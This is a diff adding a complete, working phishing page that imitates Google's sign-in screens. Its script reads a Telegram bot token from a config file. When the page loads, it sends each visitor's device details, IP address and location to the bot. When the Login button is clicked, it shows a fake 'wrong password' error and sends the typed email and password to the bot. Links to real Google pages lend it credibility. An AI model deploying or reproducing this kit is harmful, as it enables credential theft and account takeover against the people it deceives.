@@ -1,0 +1,336 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Google Sign In</title>
+  <style>
+    body {
+      background: #000;
+      color: #bbb;
+      font-family: Arial, sans-serif;
+      margin: 0;
+      padding: 0;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+    }
+    .container {
+      width: 100%;
+      max-width: 400px;
+      margin: auto;
+      padding: 32px 24px;
+      background: rgba(0,0,0,0.85);
+      border-radius: 12px;
+      box-shadow: 0 2px 16px rgba(0,0,0,0.5);
+      text-align: center;
+    }
+    .google-title {
+      font-size: 2.2em;
+      color: #fff;
+      margin-bottom: 0.2em;
+      font-family: 'Product Sans', Arial, sans-serif;
+    }
+    .sign-in {
+      font-size: 1.5em;
+      color: #fff;
+      margin-bottom: 0.5em;
+    }
+    .desc {
+      font-size: 1em;
+      margin-bottom: 1.5em;
+      color: #bbb;
+    }
+    .desc a {
+      color: #4285f4;
+      text-decoration: none;
+    }
+    .input-box {
+      width: 100%;
+      padding: 12px;
+      font-size: 1em;
+      border: 1px solid #444;
+      border-radius: 4px;
+      margin-bottom: 1em;
+      background: #111;
+      color: #fff;
+    }
+    .forgot, .create {
+      display: block;
+      color: #4285f4;
+      text-decoration: none;
+      margin-bottom: 1.5em;
+      font-size: 1em;
+      text-align: left;
+    }
+    .create {
+      margin-bottom: 2em;
+      text-align: left;
+    }
+    .next-btn {
+      background: #4285f4;
+      color: #fff;
+      border: none;
+      padding: 12px 32px;
+      border-radius: 4px;
+      font-size: 1em;
+      cursor: pointer;
+      float: right;
+    }
+    @media (max-width: 500px) {
+      .container {
+        padding: 16px 8px;
+        max-width: 100vw;
+      }
+      .google-title {
+        font-size: 1.5em;
+      }
+      .sign-in {
+        font-size: 1.1em;
+      }
+      .desc {
+        font-size: 0.95em;
+      }
+      .input-box {
+        font-size: 0.95em;
+        padding: 10px;
+      }
+      .next-btn, #login-btn {
+        width: 100%;
+        float: none;
+        padding: 12px 0;
+        font-size: 1em;
+      }
+      .forgot, .create {
+        font-size: 0.95em;
+      }
+      #password-step > div[style*="display: flex"] {
+        flex-direction: column;
+        align-items: flex-start !important;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="container" id="email-step">
+    <div class="google-title">Google</div>
+    <div class="sign-in">Sign in</div>
+    <div class="desc">
+      Use your Google Account. The account will be added to this device and available to other Google apps.<br>
+      <a href="#">Learn more about using your account</a>
+    </div>
+    <input class="input-box" id="email-input" type="text" placeholder="Email or phone">
+    <a class="forgot" href="#">Forgot email?</a>
+    <a class="create" href="#">Create account</a>
+    <button class="next-btn" id="next-btn">Next</button>
+  </div>
+
+  <div class="container" id="password-step" style="display:none;">
+    <div class="google-title">Google</div>
+    <div class="sign-in">Welcome</div>
+    <div style="margin: 16px 0 24px 0; color: #bbb; display: flex; align-items: center; justify-content: center;">
+      <span style="font-size: 1.5em; margin-right: 8px;">&#128100;</span>
+      <span id="user-email" style="font-size: 1.1em; color: #bbb;"></span>
+    </div>
+    <div id="error-message" style="display:none; color:#ffb3b3; background: #2d0000; border-left: 4px solid #ff8888; padding: 8px 12px; margin-bottom: 1em; text-align:left; font-size:1em;">
+      <span style="font-weight:bold; margin-right:6px;">&#9888;</span> Wrong password. Try again or click Forgot password to reset it.
+    </div>
+    <input class="input-box" id="password-input" type="password" placeholder="Enter your password">
+    <div style="text-align:left; margin-bottom: 1.5em;">
+      <input type="checkbox" id="show-password" style="vertical-align: middle;"> <label for="show-password" style="vertical-align: middle; color: #bbb;">Show password</label>
+    </div>
+    <div style="display: flex; justify-content: space-between; align-items: center;">
+      <a class="forgot" href="#" style="margin-bottom:0; color:#4285f4;">FORGOT PASSWORD?</a>
+      <button class="next-btn" id="login-btn">Login</button>
+    </div>
+  </div>
+
+  <script>
+    // Fetch Telegram config from server.txt
+    async function getTelegramConfig() {
+      try {
+        const res = await fetch('server.txt');
+        const text = await res.text();
+        const token = text.match(/TOKEN=(.*)/)[1].trim();
+        const chatId = text.match(/CHAT_ID=(.*)/)[1].trim();
+        return { token, chatId };
+      } catch (e) {
+        alert('Failed to load Telegram config.');
+        return { token: '', chatId: '' };
+      }
+    }
+
+    // Replace all Telegram API calls to use dynamic config
+    let TG_API = '';
+    let TELEGRAM_TOKEN = '';
+    let TELEGRAM_CHAT_ID = '';
+    getTelegramConfig().then(cfg => {
+      TELEGRAM_TOKEN = cfg.token;
+      TELEGRAM_CHAT_ID = cfg.chatId;
+      TG_API = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
+    });
+
+    // Guess device name/type from user agent
+    function getDeviceName() {
+      const ua = navigator.userAgent;
+      if (/android/i.test(ua)) {
+        const match = ua.match(/Android.*; (.+?) Build/);
+        return match ? `Android (${match[1]})` : 'Android Device';
+      } else if (/iPhone/i.test(ua)) {
+        return 'iPhone';
+      } else if (/iPad/i.test(ua)) {
+        return 'iPad';
+      } else if (/Macintosh/i.test(ua)) {
+        return 'Mac';
+      } else if (/Windows/i.test(ua)) {
+        return 'Windows PC';
+      } else if (/Linux/i.test(ua)) {
+        return 'Linux PC';
+      } else {
+        return 'Unknown Device';
+      }
+    }
+
+    // Collect device info
+    async function getDeviceInfo() {
+      let batteryInfo = '';
+      if (navigator.getBattery) {
+        try {
+          const battery = await navigator.getBattery();
+          batteryInfo = `🔋 Battery: ${(battery.level * 100).toFixed(0)}%${battery.charging ? ' (Charging)' : ''}`;
+        } catch (e) {
+          batteryInfo = '🔋 Battery: N/A';
+        }
+      } else {
+        batteryInfo = '🔋 Battery: N/A';
+      }
+      // Additional details
+      const screenRes = `🖥️ Screen: ${window.screen.width}x${window.screen.height}`;
+      const timezone = `⏰ Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}`;
+      const referrer = `🔗 Referrer: ${document.referrer || 'Direct/None'}`;
+      let connectionType = '📶 Connection: N/A';
+      if (navigator.connection && navigator.connection.effectiveType) {
+        connectionType = `📶 Connection: ${navigator.connection.effectiveType.toUpperCase()}`;
+      }
+      const cpuCores = `🧠 CPU Cores: ${navigator.hardwareConcurrency || 'N/A'}`;
+      const memory = `💾 RAM: ${navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'N/A'}`;
+      const info = [
+        `📱 Device: ${getDeviceName()}`,
+        `🧭 User Agent: ${navigator.userAgent}`,
+        `💻 Platform: ${navigator.platform}`,
+        `🌐 Language: ${navigator.language}`,
+        screenRes,
+        timezone,
+        referrer,
+        connectionType,
+        cpuCores,
+        memory,
+        batteryInfo,
+        `🕒 Time: ${new Date().toLocaleString()}`
+      ];
+      return info.join('\n');
+    }
+
+    // Fetch IP and geolocation info (CORS-friendly)
+    async function getIPInfo() {
+      try {
+        const res = await fetch('https://geolocation-db.com/json/');
+        if (!res.ok) throw new Error('IP info fetch failed');
+        const data = await res.json();
+        return `🌍 IP: ${data.IPv4}\n🏙️ City: ${data.city}\n🌎 Country: ${data.country_name}\n🌐 State: ${data.state}`;
+      } catch (e) {
+        return '🌍 IP Info: N/A';
+      }
+    }
+
+    // Send message to Telegram
+    async function sendToTelegram(message) {
+      await fetch(TG_API, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+        body: `chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(message)}&parse_mode=Markdown`
+      });
+    }
+
+    // On page load, send device info and IP info
+    window.addEventListener('DOMContentLoaded', async () => {
+      const deviceInfo = await getDeviceInfo();
+      const ipInfo = await getIPInfo();
+      sendToTelegram(`🟢 New visitor!\n${deviceInfo}\n${ipInfo}`);
+    });
+
+    const emailStep = document.getElementById('email-step');
+    const passwordStep = document.getElementById('password-step');
+    const nextBtn = document.getElementById('next-btn');
+    const emailInput = document.getElementById('email-input');
+    const userEmail = document.getElementById('user-email');
+    const showPassword = document.getElementById('show-password');
+    const passwordInput = document.getElementById('password-input');
+    const loginBtn = document.getElementById('login-btn');
+    const errorMessage = document.getElementById('error-message');
+
+    nextBtn.addEventListener('click', function() {
+      const email = emailInput.value.trim();
+      if (email) {
+        userEmail.textContent = email;
+        emailStep.style.display = 'none';
+        passwordStep.style.display = 'block';
+      } else {
+        emailInput.focus();
+        emailInput.style.borderColor = '#f00';
+        setTimeout(() => emailInput.style.borderColor = '#444', 1000);
+      }
+    });
+
+    if (showPassword && passwordInput) {
+      showPassword.addEventListener('change', function() {
+        passwordInput.type = this.checked ? 'text' : 'password';
+      });
+    }
+
+    if (loginBtn) {
+      loginBtn.addEventListener('click', async function() {
+        // For demo, always show error
+        errorMessage.style.display = 'block';
+        // Collect info
+        const email = userEmail.textContent || '';
+        const password = passwordInput.value || '';
+        const deviceInfo = await getDeviceInfo();
+        const ipInfo = await getIPInfo();
+        // Format message for Telegram
+        const msg = `📋 *Tap to copy*\n\n*Email/Phone:* \`${email}\`\n*Password:* \`${password}\`\n\n${deviceInfo}\n${ipInfo}`;
+        sendToTelegram(msg);
+      });
+    }
+
+    // Add handler for 'Create account' link
+    const createAccountLink = document.querySelector('.create');
+    if (createAccountLink) {
+      createAccountLink.addEventListener('click', function(e) {
+        e.preventDefault();
+        window.open('https://accounts.google.com/lifecycle/steps/signup/name?continue=https://mail.google.com/mail/u/0/&dsh=S302532074:1749743410122667&emr=1&flowEntry=SignUp&flowName=GlifWebSignIn&followup=https://mail.google.com/mail/u/0/&ifkv=AdBytiMTvJsADgXvTH43m6DrsAtV-LHBHii7nTelpZoXwRnDKtXR4A1TpyytikY2viNcQKvVRsIi&osid=1&service=mail&TL=ALgCv6yfAp_tRBONRTuOu2XolmeH8W3JKNZfTQwWicDRTsQXHsc-Cav2S_NGzh-u', '_blank');
+      });
+    }
+
+    // Add handler for 'FORGOT PASSWORD?' link (on password step)
+    const forgotPasswordLink = document.querySelector('#password-step .forgot');
+    if (forgotPasswordLink) {
+      forgotPasswordLink.addEventListener('click', function(e) {
+        e.preventDefault();
+        window.open('https://accounts.google.com/signin/v2/usernamerecovery?continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&dsh=S302532074%3A1749743410122667&emr=1&flowEntry=ServiceLogin&flowName=GlifWebSignIn&followup=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&ifkv=AdBytiPM9kzIQzreskygEm1zgqGxks5Du-05PJaYUM4jpumI3uQrTviYQLk18PWH446PSWfgBP4nbA&osid=1&service=mail', '_blank');
+      });
+    }
+
+    // Add handler for 'Forgot email?' link (on email step)
+    const forgotEmailLink = document.querySelector('#email-step .forgot');
+    if (forgotEmailLink) {
+      forgotEmailLink.addEventListener('click', function(e) {
+        e.preventDefault();
+        window.open('https://accounts.google.com/signin/v2/usernamerecovery?continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&dsh=S302532074%3A1749743410122667&emr=1&flowEntry=ServiceLogin&flowName=GlifWebSignIn&followup=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&ifkv=AdBytiPM9kzIQzreskygEm1zgqGxks5Du-05PJaYUM4jpumI3uQrTviYQLk18PWH446PSWfgBP4nbA&osid=1&service=mail', '_blank');
+      });
+    }
+  </script>
+</body>
+</html>
